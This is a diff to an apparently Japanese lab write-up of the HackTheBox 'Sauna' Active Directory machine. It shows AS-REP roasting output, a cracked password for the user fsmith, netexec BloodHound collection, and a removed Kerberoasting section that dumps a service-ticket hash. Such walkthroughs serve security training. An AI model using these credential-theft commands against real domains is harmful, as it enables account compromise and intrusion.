@@ -126,7 +126,7 @@ LDAP        10.129.95.180   389    SAUNA            $krb5asrep$23$fsmith@EGOTIST
 ```
 クラック成功、fsmithのパスワードはThestrokes23
 ```sh
-└─$ nth -f asreproast.txt --no-banner --no-john                                                                            
+└─$ name-that-hash -f asreproast.txt --no-banner --no-john                                                                            
 
 $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:59bee1196843ecf6fcbfe16e736d2f2e$8f2dd9c5a07d9fee96a351010bafbd7c9d2de474aa5ec6925773990cd87534c81d01746c1aeb6a0481f8101b95081746247212fc3918899124294f7c123eb12216a599ce297c617c9d263e02e72d4c5
 e148e561af9281a549d8a79445ce0fc5c6a12dd97acee05a8225234eb6da2ec7ffe8821bc78225b9a645ca2bd4bceaa022a11d9550aaef0fe8be1c50271e9bbdc3d3bb8e4c381863a16472bcac8f7da8eccd8a1ad6e2b8c7abc3af275649b0b51bb11ea373a3e8b025c40f63eaae65931bc4c5ca3728
@@ -406,39 +406,10 @@ autologonから、svc_loanmanager のパスワード判明！
 
 ## STEP 4
 ```sh
-└─$ netexec ldap 10.129.95.180 --dns-server '10.129.95.180' -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --bloodhound --collection All
+└─$ netexec ldap 10.129.95.180 --dns-server '10.129.95.180' -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --bloodhound --collection Group
 LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
 LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
 LDAP        10.129.95.180   389    SAUNA            Resolved collection methods: acl, rdp, group, dcom, objectprops, session, psremote, localadmin, container, trusts
 LDAP        10.129.95.180   389    SAUNA            Done in 01M 28S
 LDAP        10.129.95.180   389    SAUNA            Compressing output into /home/kali/.nxc/logs/SAUNA_10.129.95.180_2025-07-29_100418_bloodhound.zip
-```
-```sh
-└─$ sudo ntpdate 10.129.95.180
-2025-07-29 12:01:08.765561 (-0400) +25202.159080 +/- 0.169316 10.129.95.180 s1 no-leap
-CLOCK: time stepped by 25202.159080
-                                                                                                                                                                                                                                            
-└─$ netexec ldap 10.129.95.180 -u 'EGOTISTICAL-BANK.LOCAL\fsmith' -p 'Thestrokes23' --kdcHost '10.129.95.180' --kerberoasting kerberoast.txt
-LDAP        10.129.95.180   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL)
-LDAP        10.129.95.180   389    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 
-LDAP        10.129.95.180   389    SAUNA            [*] Skipping disabled account: krbtgt
-LDAP        10.129.95.180   389    SAUNA            [*] Total of records returned 1
-LDAP        10.129.95.180   389    SAUNA            [*] sAMAccountName: HSmith, memberOf: [], pwdLastSet: 2020-01-23 00:54:34.140321, lastLogon: <never>
-LDAP        10.129.95.180   389    SAUNA            $krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL\HSmith*$eaab21eeedf28cc639f4331470c3b6a4$12f9f446c481b8347cf1842f02e62023a3533015c76c2522c5a1ba7edc1a3563d3e30a9e9528ffb21a914479053b1c34c600d598f8d803e06b28163d665fca8e90dae3c2e11620db882a4c49a6c4546f2296d89cd7cf3f95c57a64300959a853c4edd1de60a9add4442fdc77e60fd64fe704a5d0abbfa884ceca9e1b1aaf4096c6e86390ed3bd79002a0529cc00f11e7820ef1a3e0a026b4f542a36d32de6c4ee456a4f355d6bc4c4f650f26c958a29e9e056cf399afed6f13cea3349c3fe761cc54b7d11b5dab11f6d17edde52a1cc84b39eb87b5fb89c9beeb81509116b2b48f0bcb0e059a19eb79f4a153c1faa7c7d8ce4b1a03e4daa425eb4c2ae4dbb63e52f36651e152670d55f2cbcfe1a4a9aa60c9e4bdb70a73c7959d20ba9c23d3d5d84bc8c8a26c5a74e6d2a03669b54c1d5b4c878c8f5a2bca11e633cec92610793db42a8b1136063cd8e1d5d31f66193327047eb67484369a7dfc9264ca9c2c11b9bc5f7ab530c14b3f77cbf992db390f63feed06e1e12df9d0049e05ae8bb70225fae338292aaedecfd3df22a3210dcedfc992b3f749e05effab21e59aef4d0fef8ce6103ece79e41d6102ba6d4cfce66b5a791fd772e324363f453fc71be9af476fa8bf370c53e421f2bdd9e4cc6d1f9598e18d862b94da4a2a4fffd98f3d08538698434d0c5e01ea5158ef682cc55f418e940fcf5ec2a4216d6f3f29c4697c7fd8d2db4dbcea686faeceac03fe08bc887849809420161aa2e02ec8c01c91ad2ad8896826b7e3749bd8b82fe944e9c8c4a9744fb83f43b24ac55896b5e0ef910300c2d09e0c5f9442b43d309503fd97ea5c4c5f0a1754c6cf54e32fa8b2e89ffd5145ceeeb88ce0f65b159b534ec302844f2a078486f1c4ae9991b24eb997d669cb3ecd0fc779a824d7eb0264734b381b6dba163ae0f541eae69b9828378eb7ad8cf7400633afb9862ecdc153192bbafb02d976d35e2800761828528af6fecc217440c557a7edac5332596af8f945713f83e7dd6e0dec7c8aef27442487711875310cdf5e73dc881baeb0be1a2b41fda8bd79d17c8dfb6fb8dc2fda578ddac35d30fdfcb3ad99666a304deb5ade3cc72cd009f3febe43213877f93363a58abdb44cd9b4e9f213f2826518ce5de17ec61d3f7e5282631927a840f4773d1e0630e05a4a98d35343b450f79802b51ba5d868d5da441b929291dfd6591b8ee992616735f7e07a813ac26a7a380982bb46633ff4a2d14e18e19f96e1ac1262d37663de8979ecabe654eaad47c90114e7a82e265d52a1e0a369630d74e39432b203d5fb70f0508d37c7bd5ebdb99cb504901ccb8a2ef2c91aab1c69a12a6a1b935972da176671b42c44c172cc6eac0750dcdfaeca79a5b9ed66ade315b4cb69a70b9703f52f37b5
-```
-```sh
-└─$ nth -f kerberoast.txt --no-banner --no-john                                                                                    
-
-$krb5tgs$23$*HSmith$EGOTISTICAL-BANK.LOCAL$EGOTISTICAL-BANK.LOCAL\HSmith*$eaab21eeedf28cc639f4331470c3b6a4$12f9f446c481b8347cf1842f02e62023a3533015c76c2522c5a1ba7edc1a3563d3e30a9e9528ffb21a914479053b1c34c600d598f8d803e06b28163d665fca8e9
-0dae3c2e11620db882a4c49a6c4546f2296d89cd7cf3f95c57a64300959a853c4edd1de60a9add4442fdc77e60fd64fe704a5d0abbfa884ceca9e1b1aaf4096c6e86390ed3bd79002a0529cc00f11e7820ef1a3e0a026b4f542a36d32de6c4ee456a4f355d6bc4c4f650f26c958a29e9e056cf399afe
-d6f13cea3349c3fe761cc54b7d11b5dab11f6d17edde52a1cc84b39eb87b5fb89c9beeb81509116b2b48f0bcb0e059a19eb79f4a153c1faa7c7d8ce4b1a03e4daa425eb4c2ae4dbb63e52f36651e152670d55f2cbcfe1a4a9aa60c9e4bdb70a73c7959d20ba9c23d3d5d84bc8c8a26c5a74e6d2a0366
-9b54c1d5b4c878c8f5a2bca11e633cec92610793db42a8b1136063cd8e1d5d31f66193327047eb67484369a7dfc9264ca9c2c11b9bc5f7ab530c14b3f77cbf992db390f63feed06e1e12df9d0049e05ae8bb70225fae338292aaedecfd3df22a3210dcedfc992b3f749e05effab21e59aef4d0fef8ce
-6103ece79e41d6102ba6d4cfce66b5a791fd772e324363f453fc71be9af476fa8bf370c53e421f2bdd9e4cc6d1f9598e18d862b94da4a2a4fffd98f3d08538698434d0c5e01ea5158ef682cc55f418e940fcf5ec2a4216d6f3f29c4697c7fd8d2db4dbcea686faeceac03fe08bc887849809420161aa
-2e02ec8c01c91ad2ad8896826b7e3749bd8b82fe944e9c8c4a9744fb83f43b24ac55896b5e0ef910300c2d09e0c5f9442b43d309503fd97ea5c4c5f0a1754c6cf54e32fa8b2e89ffd5145ceeeb88ce0f65b159b534ec302844f2a078486f1c4ae9991b24eb997d669cb3ecd0fc779a824d7eb0264734
-b381b6dba163ae0f541eae69b9828378eb7ad8cf7400633afb9862ecdc153192bbafb02d976d35e2800761828528af6fecc217440c557a7edac5332596af8f945713f83e7dd6e0dec7c8aef27442487711875310cdf5e73dc881baeb0be1a2b41fda8bd79d17c8dfb6fb8dc2fda578ddac35d30fdfcb
-3ad99666a304deb5ade3cc72cd009f3febe43213877f93363a58abdb44cd9b4e9f213f2826518ce5de17ec61d3f7e5282631927a840f4773d1e0630e05a4a98d35343b450f79802b51ba5d868d5da441b929291dfd6591b8ee992616735f7e07a813ac26a7a380982bb46633ff4a2d14e18e19f96e1a
-c1262d37663de8979ecabe654eaad47c90114e7a82e265d52a1e0a369630d74e39432b203d5fb70f0508d37c7bd5ebdb99cb504901ccb8a2ef2c91aab1c69a12a6a1b935972da176671b42c44c172cc6eac0750dcdfaeca79a5b9ed66ade315b4cb69a70b9703f52f37b5
-
-Most Likely 
-Kerberos 5 TGS-REP etype 23, HC: 13100 Summary: Used in Windows Active Directory.
 ```
